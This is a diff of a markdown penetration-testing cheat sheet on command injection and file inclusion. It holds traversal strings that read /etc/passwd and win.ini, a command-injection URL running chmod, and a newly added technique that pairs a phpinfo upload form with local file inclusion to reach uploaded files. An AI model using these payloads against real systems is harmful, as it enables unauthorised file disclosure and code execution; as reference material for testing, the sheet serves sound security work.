@@ -49,6 +49,7 @@ http://victim/file?arg=$({chmod,+x,/tmp/t})
 /index.php?page=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00Admin'.sleep(hexdec(dechex(20))).'
 {% endhighlight %}
 
+
 > **File Inclusion**
 
 **Discovery**
@@ -139,11 +140,13 @@ http://website/?p=file%3a%2f%2f%2fetc%2fpasswd
 **Windows Test Strings:**
 
 {% highlight bash %}
-../../../winnt/system32.cmd.exe+/c+dir (not frequent) </code>
+../../../winnt/system32.cmd.exe+/c+dir (not frequent)
 
 %WINDIR%\win.ini 
 
-%SYSTEMDRIVE%\boot.ini //note only older versions of windows </code>
+C:\windows\win.ini
+
+%SYSTEMDRIVE%\boot.ini //note only older versions of windows 
 {% endhighlight %}
 
 **Auto-Extension (.php) Bypass (PHP version < 5.3):**
@@ -294,6 +297,22 @@ Navigate to that location using LFI.
 * [LFI Shell 1](http://resources.infosecinstitute.com/local-file-inclusion-code-execution/)
 * [LFI Shell 2](https://highon.coffee/blog/lfi-cheat-sheet/)
 
+
+**PHPINFO File Upload for LFI**
+Create a script that does (e.g., phpinfoLFI.py):
+1. Create an HTML file onthe attackers box
+{% highlight HTML %}
+<html><body>
+<form enctype="multipart/form=data" action="phpinfo.php" method="POST">
+  <input name="upfile" type="file" />
+  <input type="submit" /> 
+  </form>
+  </body></html>
+{% endhighlight %}
+
+2. Look at the return page for the random file name and location [tmp_name] => /tmp/phpL9A0b
+
+3. Use LFI to read the file blog.site.org/fileview.php?loc=/tmp/phpL9A0b
 
 > **Web Shells**
 
